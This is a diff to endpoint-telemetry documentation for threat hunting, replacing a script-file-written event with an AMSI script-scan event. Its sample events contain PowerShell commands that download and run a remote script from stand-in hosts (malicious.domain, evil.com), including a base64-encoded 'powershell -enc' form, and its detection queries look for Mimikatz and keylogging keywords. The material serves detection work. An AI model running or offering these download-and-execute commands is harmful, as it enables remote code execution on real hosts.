@@ -1,12 +1,12 @@
-## ScriptFileWrittenInfo Table: Script File Content Event
+## ScriptControlScanTelemetry Table: Script Execution Event
 
 ### 1. Table Name
-**ScriptFileWrittenInfo**
+**ScriptControlScanTelemetry**
 
 ---
 
 ### 2. Table Usage
-This event provides the full content of a script file that was written to disk on a Windows host. Attackers frequently drop malicious scripts (e.g., PowerShell, VBScript, Batch files) onto a system to download further malware, establish persistence, or perform reconnaissance. Capturing the full script content is invaluable for threat hunting and incident response, as it allows for immediate analysis of the script's intent and capabilities.
+This event is generated when a script is scanned by a script control engine, such as the Antimalware Scan Interface (AMSI) on Windows. It captures the content of scripts as they are being executed, which is invaluable for detecting fileless malware, obfuscated commands, and other malicious in-memory activities that might otherwise evade detection.
 
 ---
 
@@ -14,9 +14,14 @@ This event provides the full content of a script file that was written to disk o
 
 | Parameter | Description | Platforms Affected |
 |---|---|---|
-| TargetFileName | The full path and file name where the script was written. | Windows Only |
-| FileFormatString | The detected format of the script file (e.g., "PowerShell", "VBScript", "Batch"). | Windows Only |
-| ScriptContent | The full text content of the script that was written to the file. | Windows Only |
+| ImageFileName | The full path to the process hosting the script engine (e.g., `powershell.exe`, `wscript.exe`). | Windows Only |
+| ParentImageFileName | The full path to the parent process that spawned the script host. | Windows Only |
+| CommandLine | The command line of the script host process. | Windows Only |
+| HostProcessType | The type of process hosting the script engine. | Windows Only |
+| ScriptingLanguageId | An identifier for the scripting language being used (e.g., PowerShell, VBScript, JScript). | Windows Only |
+| ScriptContentSource | The source of the script content (e.g., from the command line, a file, or interactive session). | Windows Only |
+| ScriptContent | The full content of the script that was scanned. | Windows Only |
+| ScriptContentBytes | The raw byte content of the script that was scanned. | Windows Only |
 
 ---
 
@@ -24,29 +29,38 @@ This event provides the full content of a script file that was written to disk o
 
 ```json
 {
-  "TargetFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\update.ps1",
-  "FileFormatString": "PowerShell",
-  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://malicious.domain/payload.exe](http://malicious.domain/payload.exe)')"
+  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "ParentImageFileName": "C:\\Windows\\System32\\cmd.exe",
+  "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA",
+  "HostProcessType": "1",
+  "ScriptingLanguageId": "1",
+  "ScriptContentSource": "2",
+  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/stager.ps1](http://evil.com/stager.ps1)')",
+  "ScriptContentBytes": "494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f6576696c2e636f6d2f7374616765722e7073312729"
 }
 ```
 
 ---
+
 ### 5. Example Queries
 
 ```xql
-// Find all instances of script files being written
-event_simpleName=ScriptFileWrittenInfo
+// Find all script control scan events
+event_simpleName=ScriptControlScanTelemetry
 
-// Hunt for PowerShell scripts written to disk
-event_simpleName=ScriptFileWrittenInfo FileFormatString="PowerShell"
+// Hunt for scripts executed by PowerShell
+event_simpleName=ScriptControlScanTelemetry ImageFileName="*\\powershell.exe"
 
-// Find scripts written to a temporary or user-profile directory
-event_simpleName=ScriptFileWrittenInfo TargetFileName="*\\Temp\\*" OR TargetFileName="*\\AppData\\*"
+// Find scripts where the parent process was something other than explorer.exe or cmd.exe
+event_simpleName=ScriptControlScanTelemetry ParentImageFileName!="C:\\Windows\\explorer.exe" ParentImageFileName!="C:\\Windows\\System32\\cmd.exe"
 
-// Search for specific suspicious commands within the script content
-event_simpleName=ScriptFileWrittenInfo ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Expression*" OR ScriptContent="*IEX*"
+// Search for suspicious keywords within the script content
+event_simpleName=ScriptControlScanTelemetry ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Mimikatz*" OR ScriptContent="*Get-Keystrokes*"
 
-// Find potentially malicious VBScripts being dropped
-event_simpleName=ScriptFileWrittenInfo TargetFileName="*.vbs" ScriptContent="*CreateObject*"
+// Find scripts that were passed via the command line (often obfuscated)
+event_simpleName=ScriptControlScanTelemetry ScriptContentSource=2
+
+// Look for JScript or VBScript execution, which is less common for legitimate admin tasks
+event_simpleName=ScriptControlScanTelemetry ScriptingLanguageId IN (2, 3)
 ```
 ---
